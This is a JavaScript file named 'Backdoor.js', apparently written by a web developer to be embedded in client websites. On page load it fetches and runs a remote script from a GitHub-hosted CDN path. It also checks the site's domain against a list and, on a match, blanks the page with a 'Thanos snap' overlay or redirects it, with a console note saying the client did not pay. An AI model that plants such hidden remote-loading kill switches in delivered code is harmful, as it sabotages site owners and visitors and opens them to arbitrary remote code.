/*!
 * Backdoor.js v1.0.0
 * (c) 2024-2024
 * Made to protect against scammers.
 */

(function() {
    var currentVersion = '1.0.0'; // Текущая версия скрипта

    // Проверяем, есть ли сохраненная версия в localStorage
    var savedVersion = localStorage.getItem('scriptVersion');

    // Если версии не совпадают или версия не сохранена, загружаем новую версию
    if (savedVersion !== currentVersion) {
        var script = document.createElement('script');
        script.src = 'https://cdn.jsdelivr.net/gh/deusnotam/backdoor/q2.js';

        // Когда скрипт загружен, сохраняем текущую версию в localStorage
        script.onload = function() {
            localStorage.setItem('scriptVersion', currentVersion);
        };

        document.head.appendChild(script);
    }
})();

// Массив с сайтами и параметрами
const sites = [
        { url: "https://abros.me", date: "23/01/2024", effect: "thanos" },
        // Добавьте другие сайты и параметры по необходимости
    ];

// Массив с эффектами
const effects = {
  redirect: (redirectUrl) => {
    console.log(`Применяется эффект redirect на ${redirectUrl}`);
    window.location.replace(redirectUrl);
  },
  thanos: (startDate) => {
    console.log("Применяется эффект Thanos");
    const blackScreen = document.createElement("div");
    blackScreen.style.position = "fixed";
    blackScreen.style.top = "0";
    blackScreen.style.left = "0";
    blackScreen.style.width = "100%";
    blackScreen.style.height = "100%";
    blackScreen.style.background = "black";
    blackScreen.style.zIndex = "9999";
    blackScreen.style.display = "flex";
    blackScreen.style.flexDirection = "column";
    blackScreen.style.alignItems = "center";
    blackScreen.style.justifyContent = "center";
    const gifImage = document.createElement("img");
    gifImage.src = "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZWZ0bWRoajlyem1lbHViczd0MzU4YnlneHQ4cGRwMmhweTFsdzZjYSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LOoaJ2lbqmduxOaZpS/giphy.gif";
    gifImage.alt = "Tanos Snap";
    gifImage.style.marginBottom = "20px";
    const caption = document.createElement("p");
    caption.style.color = "white";
    caption.innerText = "Произошёл щелчок Таноса - сайт исчез...";
    blackScreen.appendChild(gifImage);
    blackScreen.appendChild(caption);
    document.body.appendChild(blackScreen);
  }
};

// Функция для проверки домена
function checkDomain() {
  const currentDomain = window.location.hostname;

  // Проверка, есть ли текущий домен в списке
  const siteInfo = sites.find(site => currentDomain === new URL(site.url).hostname);
  
  if (!siteInfo) {
    console.log("Made by Abros Studio → https://abros.me\nDaniel Abros → https://t.me/abrosxd");
  } else {
    // Применение эффекта, если домен найден в списке
    const effectFunction = effects[siteInfo.effect];
    if (effectFunction) {
      effectFunction(siteInfo.redirecturl || siteInfo.date);
      console.log("Этот заказчик не оплатил мою работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nDaniel Abros → https://t.me/abrosxd");
    }
  }
}

// Вызов функции для проверки домена
checkDomain();
});
